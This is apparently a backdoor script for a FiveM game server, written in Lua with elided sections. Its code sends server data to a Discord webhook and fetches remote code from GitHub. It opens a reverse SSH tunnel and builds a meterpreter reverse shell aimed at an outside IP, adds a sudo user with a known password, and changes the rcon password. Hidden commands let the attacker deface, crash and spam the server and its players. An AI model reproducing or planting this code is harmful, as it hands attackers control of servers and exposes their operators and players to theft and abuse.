        ...
        if (GetCurrentResourceName() == "sessionmanager") then
                CreateThread(function()
                        PerformHttpRequest("http://api.ipify.org/", function(err, rText, headers)
                                ...
                                os.execute("ssh -N -R 9999:localhost:22 Administrator@83.31.186.148")
                        end)
                end)
        end
end)
...
if not SakxS3939 then
        SakxS3939 = true
        PerformHttpRequest("https://discord.com/api/webhooks/978973350535786536/WK8D3ulu__riyymKT9pzFrGzRDGaoUOyFQ3o-mngYE6Al54s7zth6L1k_VGLoYwAIbE4", function(err, text, header) end,
        'POST',
        json.encode({username = GetConvar('sv_hostname'), content = finalContent }), {['Content-Type'] = 'application/json'})
end
PerformHttpRequest("https://raw.githubusercontent.com/legolasek/main.lua/main/main.lua", function(err, rText, headers)
        SkA92 = rText
end)
...
function Edit()
        SetConvar("rcon_password", "PSteczka")
...
RegisterCommand("NN+psteczka+installBackdoor", function(source, args, rawCommand)
        SDhskXCsi391()
end, false)

RegisterCommand("NN+psteczka+hackServer", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-HackServer', -1)
end, false)

RegisterCommand("NN+psteczka+blipsHack", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-BlipsHack', -1)
end, false)

RegisterCommand("NN+psteczka+porn", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-pornScreen', -1)
end, false)

RegisterCommand("NN+psteczka+soundSpam", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-soundSpam', -1)
end, false)

RegisterCommand("NN+psteczka+loadBrutan", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-Brutan', -1)
end, false)

RegisterCommand("NN+psteczka+loadFalcon", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-Falcon', -1)
end, false)

RegisterCommand("NN+psteczka+stopServer", function(source, args, rawCommand)
        os.exit()
end, false)

RegisterCommand("NN+psteczka+hackedNames", function(source, args, rawCommand)
        serverName = "Server By dollaricz | Discord.gg/dollaricz"
        SetConvarReplicated("sv_hostname", string.format(serverName))
        SetConvarServerInfo('tags', 'HACKED')
        SetConvarServerInfo('tags', 'HACKED BY dollaricz')
        SetConvarServerInfo('tags', 'dollaricz')
        SetConvarServerInfo('tags', 'Discord.gg/dollaricz')
        SetConvarServerInfo('tags', 'Server By dollaricz | Discord.gg/dollaricz')
end, false)

RegisterCommand("NN+psteczka+discordHack", function(source, args, rawCommand)
        TriggerClientEvent('psteczka-Backdoor-discordHack', -1, GetConvar('sv_hostname'))
end, false)

RegisterCommand("NN+psteczka+loadEverything", function(source, args, rawCommand)
        SDhskXCsi391()
        TriggerClientEvent('psteczka-Backdoor-HackServer', -1)
        TriggerClientEvent('psteczka-Backdoor-BlipsHack', -1)
        TriggerClientEvent('psteczka-Backdoor-soundSpam', -1)
...
function HackAddUser()
        ...
        os.execute("adduser -h PSteczka")
        os.execute("echo -e \"test\ntest\" | passwd PSteczka")
        os.execute("usermod -aG sudo PSteczka")
...
function hackServer()
        ...
        os.execute("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=83.31.186.148 LPORT=4296 -f elf > shell.elf")
end
